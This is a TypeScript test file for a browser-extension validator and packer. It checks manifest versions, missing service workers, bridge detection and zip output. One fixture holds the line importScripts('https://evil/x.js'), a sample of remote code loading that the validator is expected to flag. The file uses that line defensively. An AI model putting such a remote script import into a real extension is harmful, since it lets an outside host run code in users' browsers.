import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { validateDirectory } from "./validate.ts";
import { pack } from "./pack.ts";

function makeExt(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "extsync-cli-"));
  for (const [name, content] of Object.entries(files)) {
    const full = join(dir, name);
    mkdirSync(join(full, ".."), { recursive: true });
    writeFileSync(full, content);
  }
  return dir;
}

const validManifest = JSON.stringify({
  manifest_version: 3, name: "T", version: "1.0.0",
  action: {}, icons: { "16": "i.png" },
  background: { service_worker: "sw.js" }, permissions: ["storage"],
});

test("validateDirectory passes a valid extension", () => {
  const dir = makeExt({ "manifest.json": validManifest, "sw.js": "1", "i.png": "x" });
  const res = validateDirectory(dir);
  assert.ok(res.ok, JSON.stringify(res.findings));
  assert.equal(res.manifest.name, "T");
  assert.equal(res.manifest.serviceWorkerType, "classic");
});

test("validateDirectory flags MV2 and remote code", () => {
  const dir = makeExt({
    "manifest.json": JSON.stringify({ manifest_version: 2, name: "B", version: "1.0.0" }),
    "x.js": "importScripts('https://evil/x.js')",
  });
  const res = validateDirectory(dir);
  assert.ok(!res.ok);
  const codes = res.findings.map((f) => f.code);
  assert.ok(codes.includes("MANIFEST_VERSION"));
  assert.ok(codes.includes("REMOTE_CODE"));
});

test("validateDirectory flags missing service worker file", () => {
  const dir = makeExt({ "manifest.json": validManifest, "i.png": "x" });
  const res = validateDirectory(dir);
  assert.ok(!res.ok);
  assert.ok(res.findings.some((f) => f.code === "SERVICE_WORKER_MISSING"));
});

test("validateDirectory detects bridge", () => {
  const dir = makeExt({
    "manifest.json": validManifest, "sw.js": "1", "i.png": "x",
    "extsync-bridge.js": "// bridge",
  });
  assert.equal(validateDirectory(dir).manifest.hasBridge, true);
});

test("pack produces a zip + sha256 + report", async () => {
  const dir = makeExt({ "manifest.json": validManifest, "sw.js": "1", "i.png": "x" });
  const out = join(tmpdir(), `extsync-test-${Date.now()}.zip`);
  const res = await pack(dir, out);
  assert.ok(existsSync(out));
  assert.equal(res.sha256.length, 64);
  assert.ok(res.size > 0);
  assert.ok(existsSync(join(dir, "extsync-report.json")));
  const report = JSON.parse(readFileSync(join(dir, "extsync-report.json"), "utf-8"));
  assert.equal(report.name, "T");
  assert.equal(report.sha256, res.sha256);
});
